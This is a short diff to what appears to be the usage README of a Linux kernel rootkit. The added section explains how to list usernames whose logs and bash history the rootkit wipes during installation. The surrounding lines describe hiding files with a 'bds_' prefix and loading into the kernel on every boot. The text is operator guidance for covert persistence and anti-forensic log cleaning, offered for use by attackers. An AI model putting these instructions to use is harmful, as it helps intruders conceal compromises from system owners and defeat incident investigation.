@@ -124,6 +124,16 @@ __________________________________________________________
 
 To hide file and directory just give prefix bds_ to file name and directory name
 
+==How to Clean Logs and Bash History ?
+Before running installation script, add username to clean logs to usernames_to_clear_logs.txt in new line, example:
+_________
+root
+robotsoft
+_________
+
+User logs will be cleaned during rootkit installation
+
+
 ==Persistence
 
 The rootkit is activated every time the system starts up. After the reboot, wait for 1 minute, the rootkit will be loaded into kernel.
